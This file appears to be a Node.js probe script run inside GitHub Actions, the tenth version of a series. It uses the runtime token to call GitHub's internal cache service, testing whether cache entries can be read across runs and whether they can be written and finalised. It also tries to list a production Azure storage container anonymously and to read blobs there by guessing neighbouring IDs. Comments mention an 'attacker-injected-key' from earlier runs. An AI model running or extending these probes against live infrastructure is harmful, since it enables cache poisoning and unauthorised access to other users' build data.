const https = require('https');
const crypto = require('crypto');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';

// Fixed: key and version from v9 cross-run test
const CROSS_KEY = 'probe-cross-run-v9-cache';
const CROSS_VERSION = 'd822dc2ba509d29b3e769d52e536831d1c46af31f84b56dd9958860c436541a7';

function post(host, path, body) {
  return new Promise((resolve) => {
    const s = JSON.stringify(body);
    const r = https.request({
      hostname: host, path, method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 1200) })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(s); r.end();
  });
}

function blobPut(url, content) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const buf = Buffer.from(content, 'utf8');
    const r = https.request({
      hostname: u.hostname, path: u.pathname + u.search, method: 'PUT',
      headers: { 'Content-Type': 'application/octet-stream', 'Content-Length': buf.length, 'x-ms-blob-type': 'BlockBlob' }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(buf); r.end();
  });
}

function blobGet(url) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const r = https.request({
      hostname: u.hostname, path: u.pathname + u.search, method: 'GET',
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 600), headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.end();
  });
}

async function main() {
  if (!RESULTS_URL || !RUNTIME_TOKEN) { console.log('Missing env'); return; }
  const host = new URL(RESULTS_URL).hostname;
  const thisRun = ORCHESTRATION_ID.split('.')[0];

  console.log('=== V10: Cross-run cache test + Fix Finalize ===');
  console.log('This run UUID:', thisRun);

  // PART 1: Test A — Try to read the v9 cache from a DIFFERENT run (same key/version)
  // If the cache was NOT finalized (due to sizeBytes fix needed), it might not be readable.
  // But let's test cross-run scope first.
  console.log('\n=== PART 1: Cross-run GetCacheEntryDownloadURL (v9 cache, new run) ===');
  const r1 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: CROSS_KEY,
    version: CROSS_VERSION,
  });
  console.log('[CROSS-RUN] v9 cache in new run (10):', r1.status, '|', r1.body);
  // ok:true = cache created by run 9 is readable by run 10 → CROSS-RUN ACCESS (major finding!)
  // ok:false = either cache wasn't finalized OR it IS properly run-scoped

  // PART 2: Create fresh cache, upload, finalize with corrected fields
  console.log('\n=== PART 2: Fixed CreateCacheEntry + Upload + FinalizeCacheEntryUpload ===');

  const MY_KEY = 'probe-v10-finalize-fixed';
  const MY_VERSION = crypto.createHash('sha256').update(MY_KEY + '\nnode_modules').digest('hex');
  const CACHE_CONTENT = JSON.stringify({
    probe: 'v10', key: MY_KEY, run: thisRun, ts: new Date().toISOString()
  });
  const CONTENT_SIZE = Buffer.byteLength(CACHE_CONTENT, 'utf8');
  console.log('Key:', MY_KEY, '| ContentSize:', CONTENT_SIZE, 'bytes');

  const r2a = await post(host, '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', {
    key: MY_KEY, version: MY_VERSION,
  });
  console.log('[2a] CreateCacheEntry:', r2a.status, '|', r2a.body.substring(0, 200));

  if (r2a.status !== 200) { console.log('STOP: CreateCacheEntry failed'); return; }
  const entry = JSON.parse(r2a.body);
  const uploadUrl = entry.signed_upload_url;
  const blobPath = new URL(uploadUrl).pathname;
  const cacheIdMatch = blobPath.match(/\/actions-cache\/\d+-(\d+)/);
  const cacheId = cacheIdMatch ? parseInt(cacheIdMatch[1]) : null;
  console.log('CacheId:', cacheId);

  const r2b = await blobPut(uploadUrl, CACHE_CONTENT);
  console.log('[2b] Azure Blob Upload (HTTP 201 = success):', r2b.status);

  // Fix: use sizeBytes (bytes, not MB); also include key and version
  const r2c = await post(host, '/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', {
    key: MY_KEY,
    version: MY_VERSION,
    sizeBytes: CONTENT_SIZE,
  });
  console.log('[2c] FinalizeCacheEntryUpload (key+version+sizeBytes):', r2c.status, '|', r2c.body.substring(0, 300));

  // Also try with cacheId + key + version + sizeBytes
  if (cacheId) {
    const r2d = await post(host, '/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', {
      key: MY_KEY, version: MY_VERSION, cacheId, sizeBytes: CONTENT_SIZE,
    });
    console.log('[2d] FinalizeCacheEntryUpload (all fields):', r2d.status, '|', r2d.body.substring(0, 300));
  }

  // Try variant field names for size
  const r2e = await post(host, '/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', {
    key: MY_KEY, version: MY_VERSION, size: CONTENT_SIZE,
  });
  console.log('[2e] FinalizeCacheEntryUpload (size field):', r2e.status, '|', r2e.body.substring(0, 300));

  // PART 3: Read back — does it now return ok:true?
  console.log('\n=== PART 3: GetCacheEntryDownloadURL after finalize ===');
  const r3 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: MY_KEY, version: MY_VERSION,
  });
  console.log('[3] GetCacheEntryDownloadURL (same run, after finalize):', r3.status, '|', r3.body);

  if (r3.status === 200) {
    try {
      const rsp = JSON.parse(r3.body);
      if (rsp.ok && rsp.signed_download_url) {
        console.log('\n!!! CACHE HIT — ok:true in same run after finalize !!!');
        console.log('Download URL:', rsp.signed_download_url.substring(0, 100) + '...');
        console.log('Matched key:', rsp.matched_key);

        // Read the content from the download URL
        const r3b = await blobGet(rsp.signed_download_url);
        console.log('[3b] Read from download URL:', r3b.status, '| Content:', r3b.body.substring(0, 200));
      } else {
        console.log('Cache still not readable after finalize (ok:false)');
      }
    } catch(e) { console.log('Parse error:', e.message); }
  }

  // PART 4: Azure Blob container enumeration attempt
  // From v8 & v9 we have blob URLs — try to list all blobs in the container
  // The signed URL only allows write to a specific blob, not container listing
  // BUT: the storage account URL is known: productionresultssa{N}.blob.core.windows.net/actions-cache
  console.log('\n=== PART 4: Azure Blob Container Enumeration ===');

  // Try to list blobs without a SAS token (should 403/404 but reveals if anonymous access)
  const r4a = await new Promise((resolve) => {
    const r = https.request({
      hostname: 'productionresultssa9.blob.core.windows.net',
      path: '/actions-cache?comp=list&restype=container',
      method: 'GET',
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 400) })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.end();
  });
  console.log('[4a] Container list (no SAS):', r4a.status, '|', r4a.body.substring(0, 200));

  // Try to read a specific blob directly (the one we created in v9: 903-5211259320)
  // The signed write URL from v9 has expired — try without SAS
  const r4b = await new Promise((resolve) => {
    const r = https.request({
      hostname: 'productionresultssa9.blob.core.windows.net',
      path: '/actions-cache/903-5211259320',
      method: 'GET',
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 400), headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.end();
  });
  console.log('[4b] Read blob 903-5211259320 (no SAS):', r4b.status, '|', r4b.body.substring(0, 200));

  // Try adjacent blob IDs (enumeration)
  for (const blobId of ['903-5211259319', '903-5211259321', '903-5211258000', '903-5211260000']) {
    const r = await new Promise((resolve) => {
      const req = https.request({
        hostname: 'productionresultssa9.blob.core.windows.net',
        path: `/actions-cache/${blobId}`,
        method: 'HEAD',
      }, (res) => { resolve({ status: res.statusCode }); });
      req.on('error', e => resolve({ status: 'ERR' }));
      req.end();
    });
    console.log(`[4c] HEAD blob ${blobId}:`, r.status);
  }

  // PART 5: Try GetCacheEntryDownloadURL with the v8 cache entries we know exist
  // (We created two entries in v8: 'attacker-injected-key-{ts}' and 'probe-v8-cache-{uuid}')
  // If those ARE still accessible from run v10, that proves cache is NOT run-scoped
  console.log('\n=== PART 5: Check if v8 cache entries still accessible from v10 run ===');
  // We need the exact key and version from v8... they were dynamic (timestamp-based)
  // Can't test this without knowing the exact keys. Skip for now.

  // Output run UUID for future cross-run tests
  console.log('\nThis run UUID:', thisRun);
  console.log('MY_KEY=' + MY_KEY);
  console.log('MY_VERSION=' + MY_VERSION);
}

main().catch(e => console.log('Fatal:', e.message));
